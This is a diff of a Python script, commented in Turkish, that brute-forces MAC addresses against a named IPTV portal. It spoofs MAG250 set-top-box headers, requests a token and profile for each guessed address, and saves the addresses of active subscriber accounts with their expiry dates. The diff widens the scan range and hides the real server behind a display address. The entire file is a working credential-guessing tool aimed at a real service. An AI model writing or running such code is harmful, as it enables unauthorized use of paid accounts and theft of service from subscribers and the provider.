@@ -1,11 +1,12 @@
 import requests
 import json
 
-# Hedef sunucu bilgileri
-SUNUCU_URL = "http://4can.net:80/portal.php"
-C_URL = "http://4can.net:80/c/"
+# Arka plandaki gerçek sunucu
+portal_url = "http://4can.net:80/portal.php"
+# Görünürdeki panel adresi
+display_url = "http://tvserv.cc/c/"
 
-def dogrula(mac):
+def mac_dogrula(mac):
     headers = {
         'User-Agent': 'MAG250',
         'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
@@ -13,50 +14,49 @@ def dogrula(mac):
     }
     
     try:
-        # 1. Adım: Handshake
-        res = requests.get(f"{SUNUCU_URL}?type=stb&action=handshake&token=", headers=headers, timeout=10)
+        # 1. ADIM: Handshake
+        res = requests.get(f"{portal_url}?type=stb&action=handshake&token=", headers=headers, timeout=10)
         token = res.json().get('js', {}).get('token')
         
         if token:
-            # 2. Adım: Profil Bilgisi (Gerçeklik Testi)
-            # 4can gibi sunucular 'get_profile' ile gerçek veri döner.
-            profil_res = requests.get(f"{SUNUCU_URL}?type=stb&action=get_profile&token={token}", headers=headers, timeout=10)
-            data = profil_res.json().get('js', {})
+            # 2. ADIM: Profil Bilgisi Sorgulama
+            # Bu sunucu 'get_profile' üzerinden gerçek bitiş tarihi döndürüyor.
+            p_res = requests.get(f"{portal_url}?type=stb&action=get_profile&token={token}", headers=headers, timeout=10)
+            data = p_res.json().get('js', {})
             
-            # Sadece geçerli bir bitiş tarihi varsa kaydet
+            # Eğer bitiş tarihi (expired) geliyorsa hesap aktiftir
             if data and data.get('expired'):
                 skt = data.get('expired')
-                print(f"✅ BAŞARILI: {mac} | SKT: {skt}")
-                return f"{C_URL} | {mac} | SKT: {skt}"
-    except Exception as e:
-        # Bağlantı hatası olursa terminalde görelim
-        print(f"❌ Hata ({mac}): {e}")
+                print(f"✅ AKTİF HESAP: {mac} | SKT: {skt}")
+                return f"{display_url} | {mac} | SKT: {skt}"
+    except:
         pass
     return None
 
-def calistir():
-    # Tarama yapılacak blok (Örn: 00:1A:79:4C:A5)
-    prefix = "00:1A:79:4C:A5"
-    print(f"🚀 Tarama başladı: {SUNUCU_URL}")
+def taramayi_baslat():
+    # SADECE senin verdiğin çalışan blok üzerinden gidiyoruz
+    prefix = "00:1A:79:B8:3B" 
+    print(f"🚀 {display_url} (4can) taranıyor... Hedef Blok: {prefix}")
     
-    gecerli_maclar = []
+    bulunanlar = []
     
-    # 100 adet dene
-    for i in range(100):
+    # B8:3B:00'dan B8:3B:FF'e kadar tara (256 adet)
+    for i in range(256):
         suffix = hex(i)[2:].zfill(2).upper()
-        mac = f"{prefix}:{suffix}"
-        sonuc = dogrula(mac)
+        test_mac = f"{prefix}:{suffix}"
+        
+        sonuc = mac_dogrula(test_mac)
         if sonuc:
-            gecerli_maclar.append(sonuc)
-            
-    # DOSYAYI YAZ
-    # 'w' modu dosyayı tamamen sıfırlar, sadece yeni sonuçları yazar.
+            bulunanlar.append(sonuc)
+
+    # DOSYAYI SIFIRLA VE YAZ
     with open("calisan_maclar.txt", "w", encoding="utf-8") as f:
-        if gecerli_maclar:
-            f.write("\n".join(gecerli_maclar))
+        if bulunanlar:
+            f.write("\n".join(bulunanlar))
+            print(f"🏁 Tarama bitti. {len(bulunanlar)} adet aktif hesap dosyaya yazıldı.")
         else:
-            # Eğer hiç bulamazsa dosyaya bunu yazar ki eski liste silinsin
-            f.write("TARAMA YAPILDI: 4can.net üzerinde aktif MAC bulunamadı.")
+            f.write("HATA: Sunucu GitHub IP'sini engellemis olabilir veya bu blokta baska aktif yok.")
+            print("❌ Maalesef aktif hesap bulunamadı.")
 
 if __name__ == "__main__":
-    calistir()
+    taramayi_baslat()
